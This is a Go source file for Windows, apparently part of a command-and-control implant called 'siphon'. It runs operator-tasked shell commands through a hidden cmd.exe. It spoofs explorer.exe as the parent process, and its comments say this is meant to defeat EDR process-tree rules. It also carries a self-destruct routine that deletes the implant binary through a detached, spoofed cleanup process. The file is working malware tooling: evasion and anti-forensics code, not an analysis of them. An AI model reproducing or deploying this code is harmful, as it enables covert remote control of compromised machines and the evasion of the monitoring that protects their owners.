//go:build windows

package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"siphon/shared"
)

const (
	createNoWindow       = 0x08000000
	detachedProcess      = 0x00000008
	th32csSnapProcess    = 0x00000002
	processCreateProcess = 0x0080
)

var (
	modkernel32                  = syscall.NewLazyDLL("kernel32.dll")
	procCreateToolhelp32Snapshot = modkernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = modkernel32.NewProc("Process32FirstW")
	procProcess32NextW           = modkernel32.NewProc("Process32NextW")
	procVirtualProt              = modkernel32.NewProc("VirtualProtect")
	procWriteProcMem             = modkernel32.NewProc("WriteProcessMemory")
)

type processEntry32W struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriClassBase      int32
	Flags             uint32
	ExeFile           [syscall.MAX_PATH]uint16
}

// findPIDByName enumerates running processes and returns the PID of the
// first process whose executable name matches (case-insensitive).
func findPIDByName(name string) (uint32, error) {
	snap, _, err := procCreateToolhelp32Snapshot.Call(th32csSnapProcess, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return 0, fmt.Errorf("snapshot: %w", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	var entry processEntry32W
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0, fmt.Errorf("no processes")
	}

	for {
		exeName := syscall.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(exeName, name) {
			return entry.ProcessID, nil
		}
		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return 0, fmt.Errorf("process %q not found", name)
}

// spoofParent opens explorer.exe with PROCESS_CREATE_PROCESS access for
// PPID spoofing. Returns 0 if explorer.exe is unavailable (graceful fallback).
func spoofParent() syscall.Handle {
	pid, err := findPIDByName("explorer.exe")
	if err != nil {
		return 0
	}
	h, err := syscall.OpenProcess(processCreateProcess, false, pid)
	if err != nil {
		return 0
	}
	return h
}

// executeCmdStealthy runs a command with CREATE_NO_WINDOW and PPID spoofed
// under explorer.exe. This defeats EDR process-tree rules that flag
// suspicious parent→cmd.exe chains.
func executeCmdStealthy(task *shared.Task) shared.TaskResult {
	cmd := exec.Command("cmd.exe", "/c", task.Args)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: createNoWindow,
		HideWindow:    true,
	}

	if parent := spoofParent(); parent != 0 {
		cmd.SysProcAttr.ParentProcess = parent
		defer syscall.CloseHandle(parent)
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return shared.TaskResult{
			TaskID:  task.ID,
			Success: false,
			Output:  out.String() + "\nerror: " + err.Error(),
		}
	}
	return shared.TaskResult{
		TaskID:  task.ID,
		Success: true,
		Output:  out.String(),
	}
}

// executeSelfDestruct renames the implant binary, spawns a PPID-spoofed
// detached cleanup process that deletes the renamed file, and exits.
func executeSelfDestruct(task *shared.Task) shared.TaskResult {
	exePath, err := os.Executable()
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("cannot resolve exe path: %v", err)}
	}

	tmpPath := exePath + ".old"
	if err := os.Rename(exePath, tmpPath); err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("rename failed: %v", err)}
	}

	cleanup := exec.Command("cmd.exe", "/c",
		fmt.Sprintf(`ping -n 4 127.0.0.1 >nul & del /f /q "%s"`, tmpPath))
	cleanup.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: createNoWindow | syscall.CREATE_NEW_PROCESS_GROUP | detachedProcess,
		HideWindow:    true,
	}

	if parent := spoofParent(); parent != 0 {
		cleanup.SysProcAttr.ParentProcess = parent
		defer syscall.CloseHandle(parent)
	}

	if err := cleanup.Start(); err != nil {
		os.Rename(tmpPath, exePath)
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("cleanup spawn: %v", err)}
	}

	return shared.TaskResult{
		TaskID:  task.ID,
		Success: true,
		Output:  fmt.Sprintf("self-destruct: renamed %s → %s, cleanup spawned (ppid-spoofed)", exePath, tmpPath),
	}
}
